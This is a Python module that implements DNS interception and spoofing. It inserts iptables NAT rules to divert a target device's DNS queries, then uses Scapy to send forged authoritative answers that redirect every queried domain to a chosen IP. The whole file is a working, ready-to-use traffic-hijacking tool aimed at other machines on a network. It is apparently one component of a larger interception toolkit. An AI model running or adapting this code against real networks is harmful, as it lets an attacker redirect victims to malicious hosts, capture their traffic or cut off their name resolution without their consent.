"""
network/dns_spoof.py — DNS intercept and redirection.

Uses iptables REDIRECT to intercept UDP/53 and Scapy to craft spoofed responses.
This allows us to redirect specific domains (e.g. google.com) to a local IP
or simply block DNS entirely for a device.
"""

from __future__ import annotations

import ipaddress
import logging
import subprocess
import threading
import time

from scapy.all import DNS, DNSRR, IP, UDP, send

_log = logging.getLogger(__name__)


def _valid_ip(addr: str) -> bool:
    try:
        ipaddress.ip_address(addr)
    except ValueError:
        return False
    return True


class DnsSpoofManager:
    def __init__(self):
        self._lock = threading.Lock()
        self._spoof_map: dict[str, str] = {}  # target_ip -> redirect_to_ip
        self._running = False

    @staticmethod
    def _rule(target_ip: str) -> list[str]:
        """The PREROUTING match that redirects the target's UDP/53 to port 5353."""
        return [
            "-s",
            target_ip,
            "-p",
            "udp",
            "--dport",
            "53",
            "-j",
            "REDIRECT",
            "--to-ports",
            "5353",
        ]

    def start_spoof(self, target_ip: str, redirect_to: str = "1.2.3.4") -> bool:
        """Intercept and redirect DNS for target_ip."""
        if not _valid_ip(target_ip):
            _log.warning("dns_spoof: invalid target ip %r", target_ip)
            return False

        with self._lock:
            self._spoof_map[target_ip] = redirect_to
            start_thread = not self._running
            if start_thread:
                self._running = True

        # Add the REDIRECT rule idempotently: -C first so a repeated start can't
        # stack duplicate NAT rules that cleanup would then miss.
        rule = self._rule(target_ip)
        try:
            chk = subprocess.run(
                ["iptables", "-t", "nat", "-C", "PREROUTING", *rule], capture_output=True, text=True
            )
            if chk.returncode != 0:
                r = subprocess.run(
                    ["iptables", "-t", "nat", "-I", "PREROUTING", *rule],
                    capture_output=True,
                    text=True,
                )
                if r.returncode != 0:
                    _log.warning(
                        "dns_spoof: could not add REDIRECT for %s: %s", target_ip, r.stderr.strip()
                    )
        except (OSError, subprocess.SubprocessError) as e:
            _log.warning("dns_spoof: iptables error: %s", e)

        if start_thread:
            threading.Thread(target=self._sniff_loop, daemon=True, name="dns_spoof").start()
        return True

    def stop_spoof(self, target_ip: str):
        with self._lock:
            self._spoof_map.pop(target_ip, None)

        # Remove the REDIRECT rule, retrying to clear any duplicates.
        rule = self._rule(target_ip)
        try:
            for _ in range(3):
                r = subprocess.run(
                    ["iptables", "-t", "nat", "-D", "PREROUTING", *rule],
                    capture_output=True,
                    text=True,
                )
                if r.returncode != 0:
                    break
        except (OSError, subprocess.SubprocessError) as e:
            _log.warning("dns_spoof: iptables delete error: %s", e)

    def _sniff_loop(self):
        # We use a raw socket to sniff the redirected packets on 5353
        # Or more simply, since we are in modular mode, we can use Scapy sniff
        from scapy.all import sniff

        def _cb(pkt):
            try:
                if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
                    return
                if not pkt.haslayer(IP) or not pkt.haslayer(UDP):
                    return
                if not pkt[DNS].qd:
                    return

                src_ip = pkt[IP].src
                with self._lock:
                    if src_ip not in self._spoof_map:
                        return
                    redirect_to = self._spoof_map[src_ip]

                # Craft spoofed response
                qname = pkt[DNS].qd.qname
                spoofed_pkt = (
                    IP(dst=pkt[IP].src, src=pkt[IP].dst)
                    / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
                    / DNS(
                        id=pkt[DNS].id,
                        qd=pkt[DNS].qd,
                        aa=1,
                        qr=1,
                        an=DNSRR(rrname=qname, ttl=10, rdata=redirect_to),
                    )
                )
                send(spoofed_pkt, verbose=False)
            except Exception:
                # A single malformed packet must not tear down the sniffer.
                return

        # Sniff on 5353 (where packets were redirected). Restart on transient
        # interface errors instead of permanently disabling the engine.
        while self._running:
            try:
                sniff(filter="udp port 5353", prn=_cb, store=0, timeout=10)
            except Exception:
                if self._running:
                    time.sleep(2)

    def stop_all(self):
        self._running = False
        with self._lock:
            ips = list(self._spoof_map.keys())
        for ip in ips:
            self.stop_spoof(ip)
